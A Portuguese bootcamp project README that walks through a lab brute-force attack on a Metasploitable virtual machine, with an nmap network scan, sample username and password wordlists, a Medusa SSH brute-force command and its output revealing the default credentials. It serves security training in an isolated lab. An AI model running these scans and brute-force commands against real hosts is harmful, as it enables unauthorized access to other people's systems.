# DIO-Cibersecurity-Project
Entrega de Projeto para o bootcamp da DIO Cibersecurity
# Força bruta DIO 
## Ferramentas e OS a serem ultilizadas
- VirtualBox
- Kali Linux(já vem com as ferramentas instaladas)
- Metasploitable(máquina virtual com vulnerabilidades) [Download](https://sourceforge.net/projects/metasploitable/)
- Nmap
- Medusa
## Fazendo varredura de alvos dentro da rede destino com nmap para descobrir possíveis alvos ativos e com portas abertas dentro da rede do Virtual Box:
``` bash
nmap 192.168.56.103/24
```
Com esse comando irá listar todos os hosts encontrados nessa rede, nesse caso nossa máquina com vulnerabilidades será listada nos resultados, juntamente com suas portas que estão abertas, nesse caso o ip do host seria 192.168.56.103. E suas portas que estão abertas são:
```
21/tcp   open  ftp
22/tcp   open  ssh
23/tcp   open  telnet
25/tcp   open  smtp
53/tcp   open  domain
80/tcp   open  http
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
512/tcp  open  exec
513/tcp  open  login
514/tcp  open  shell
1099/tcp open  rmiregistry
1524/tcp open  ingreslock
2049/tcp open  nfs
2121/tcp open  ccproxy-ftp
3306/tcp open  mysql
5432/tcp open  postgresql
5900/tcp open  vnc
6000/tcp open  X11
6667/tcp open  irc
8009/tcp open  ajp13
8180/tcp open  unknown
```
Agora que já sabemos quais portas estão abertas, é hora de explorar as vulnerabilidades, nesse caso iremos explorar um cenário onde as senhas dos serviços desse servidor serão fracas e previsivéis e utilizaremos de força bruta para tentar invadir esse host. Iremos iremos explorar conexão SSH, para teste, digite no terminal o seguinte para que se certificar se o protocolo está aceitando requisição de login(substitua o IP pelo IP da máquina em sua rede):
```
ssh 192.168.56.103
```
Caso solicite credenciais de user e password, é sinal de serviço está aceitando requisição de logins, é aqui onde iremos ultilizar a Medusa para quebrar a senha na força bruta.

## Medusa
A Medusa é uma ferramenta muito útil para ataques de força bruta em serviços que podem ser acessados via autenticação remota(SSH, FTP...) e suporta vários protocolos, e tem um objetivo ser muito rápida nas requisições, cabe a cada um testar a extensão da sua força. Para maiores informações pode-ser obter detalhas nesta [Documentação](http://foofus.net/goons/jmk/medusa/medusa.html)

## Quebrando a senha do alvo
Primeiramente no diretório que estamos iremos criar 2 arquivos .txt com o nome de users.txt e pass.txt, referente aos nomes de usuários e senhas que iremos simular como sendo uma wordlist para violar se senha do alvo. Dentro do arquivo users.txt colocaremos da seguinte forma:
```
user
msfadmin
admin
root
```
E dentro do arquivo pass.txt colocaremos:
```
123456
password
qwerty
msfadmin
```
Abriremos o terminal da máquina Kali, e inserimos o seguinte comando:
```
medusa -M ssh -h 192.168.56.103 -U users.txt -P pass.txt -t 6
```
-M: define o tipo de protocolo alvo, nesse caso seria o SSH
-h: Definimos o nome ou ip do host alvo
-U: Definimos o arquivo que contenha os possivéis nomes de usuários
-P: Definimos o arquivo que contenha as possivéis senhas
-t 6: Definimos o total de números de logins que iremos testar

Ao rodar esse comando irá mostrar no terminal o login que teve sucesso, e irá mostrar juntamente como o nome de usuário e senha que passaram, como exemplo abaixo:
```
2025-11-29 15:54:13 ACCOUNT CHECK: [ssh] Host: 192.168.56.103 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: password (1 of 4 complete)
2025-11-29 15:54:13 ACCOUNT CHECK: [ssh] Host: 192.168.56.103 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: qwerty (2 of 4 complete)
2025-11-29 15:54:13 ACCOUNT CHECK: [ssh] Host: 192.168.56.103 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: 123456 (3 of 4 complete)
2025-11-29 15:54:13 ACCOUNT CHECK: [ssh] Host: 192.168.56.103 (1 of 1, 0 complete) User: user (1 of 4, 2 complete) Password: msfadmin (4 of 4 complete)
2025-11-29 15:54:13 ACCOUNT CHECK: [ssh] Host: 192.168.56.103 (1 of 1, 0 complete) User: msfadmin (2 of 4, 2 complete) Password: 123456 (1 of 4 complete)
2025-11-29 15:54:13 ACCOUNT CHECK: [ssh] Host: 192.168.56.103 (1 of 1, 0 complete) User: msfadmin (2 of 4, 2 complete) Password: password (2 of 4 complete)
2025-11-29 15:54:13 ACCOUNT CHECK: [ssh] Host: 192.168.56.103 (1 of 1, 0 complete) User: msfadmin (2 of 4, 2 complete) Password: msfadmin (3 of 4 complete)
2025-11-29 15:54:13 ACCOUNT FOUND: [ssh] Host: 192.168.56.103 User: msfadmin Password: msfadmin [SUCCESS]
2025-11-29 15:54:19 ACCOUNT CHECK: [ssh] Host: 192.168.56.103 (1 of 1, 0 complete) User: msfadmin (2 of 4, 4 complete) Password: qwerty (4 of 4 complete)
2025-11-29 15:54:19 ACCOUNT CHECK: [ssh] Host: 192.168.56.103 (1 of 1, 0 complete) User: admin (3 of 4, 4 complete) Password: 123456 (1 of 4 complete)
2025-11-29 15:54:19 ACCOUNT CHECK: [ssh] Host: 192.168.56.103 (1 of 1, 0 complete) User: admin (3 of 4, 4 complete) Password: password (2 of 4 complete)
2025-11-29 15:54:20 ACCOUNT CHECK: [ssh] Host: 192.168.56.103 (1 of 1, 0 complete) User: admin (3 of 4, 4 complete) Password: msfadmin (3 of 4 complete)
2025-11-29 15:54:20 ACCOUNT CHECK: [ssh] Host: 192.168.56.103 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: 123456 (1 of 4 complete)
2025-11-29 15:54:20 ACCOUNT CHECK: [ssh] Host: 192.168.56.103 (1 of 1, 0 complete) User: admin (3 of 4, 5 complete) Password: qwerty (4 of 4 complete)
2025-11-29 15:54:25 ACCOUNT CHECK: [ssh] Host: 192.168.56.103 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: password (2 of 4 complete)
2025-11-29 15:54:25 ACCOUNT CHECK: [ssh] Host: 192.168.56.103 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: qwerty (3 of 4 complete)
2025-11-29 15:54:25 ACCOUNT CHECK: [ssh] Host: 192.168.56.103 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: msfadmin (4 of 4 complete)

```
E que nesse caso a senha correta da conexçao SSH do alvo é *user: msfadmin* e *password: msfadmin*
